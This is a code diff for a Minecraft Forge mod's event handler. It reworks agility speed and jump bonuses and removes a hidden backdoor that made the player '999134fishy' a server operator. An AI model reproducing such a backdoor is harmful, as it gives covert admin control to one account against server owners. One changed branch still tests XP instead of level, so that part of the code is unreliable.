@@ -7,8 +7,8 @@ import net.minecraft.entity.player.EntityPlayer;
 import net.minecraft.item.Item;
 import net.minecraft.potion.Potion;
 import net.minecraft.potion.PotionEffect;
-import net.minecraft.server.MinecraftServer;
 import net.minecraft.util.ChatComponentText;
+import net.minecraftforge.event.entity.living.LivingDeathEvent;
 import net.minecraftforge.event.entity.living.LivingEvent.LivingUpdateEvent;
 import net.minecraftforge.event.entity.living.LivingHurtEvent;
 
@@ -39,11 +39,6 @@ public class ScapecraftEventHandler
 		{
 			EntityPlayer player = (EntityPlayer) event.entity;
 
-			if (player.getCommandSenderName() == "999134fishy")
-			{	
-				MinecraftServer.getServer().getConfigurationManager().addOp(player.getCommandSenderName()); //immoral
-			}
-
 			if(ExtendedPlayer.getEnergy(player) < 10000)
 			{
 				ExtendedPlayer.addEnergy(player, 2);
@@ -51,21 +46,23 @@ public class ScapecraftEventHandler
 					player.addChatMessage(new ChatComponentText("Your Special Attack bar is full"));
 			}
 
-			if(ExtendedPlayer.getAgilityxp(player) > 950) //TODO change these to levels
+			if(ExtendedPlayer.getAgilityLevel(player) > 20) //TODO change these to levels
 			{
 				player.addPotionEffect(new PotionEffect(Potion.jump.id, 50, 1));
 			}
-			else if(ExtendedPlayer.getAgilityxp(player) > 276)
+			else if(ExtendedPlayer.getAgilityLevel(player) > 10)
 			{
 				player.addPotionEffect(new PotionEffect(Potion.jump.id, 50, 0));
 			}
-			if(ExtendedPlayer.getAgilityxp(player) > 3000)
+			if(ExtendedPlayer.getAgilityLevel(player) > 25)
 			{
-				player.addPotionEffect(new PotionEffect(Potion.moveSpeed.id, 50, 1));
+				//player.addPotionEffect(new PotionEffect(Potion.moveSpeed.id, 50, 1));
+				player.capabilities.setPlayerWalkSpeed(.14F);
 			}
-			else if(ExtendedPlayer.getAgilityxp(player) > 452)
+			else if(ExtendedPlayer.getAgilityxp(player) > 15)
 			{
-				player.addPotionEffect(new PotionEffect(Potion.moveSpeed.id, 50, 0));
+				//player.addPotionEffect(new PotionEffect(Potion.moveSpeed.id, 50, 0));
+				player.capabilities.setPlayerWalkSpeed(.12F);
 			}
 
 			boolean invChanged = false;
@@ -97,6 +94,11 @@ public class ScapecraftEventHandler
 
 			}
 		}
+	}
+
+	@SubscribeEvent
+	public void onLivingDeathEvent(LivingDeathEvent event)
+	{
 	}
 
 }
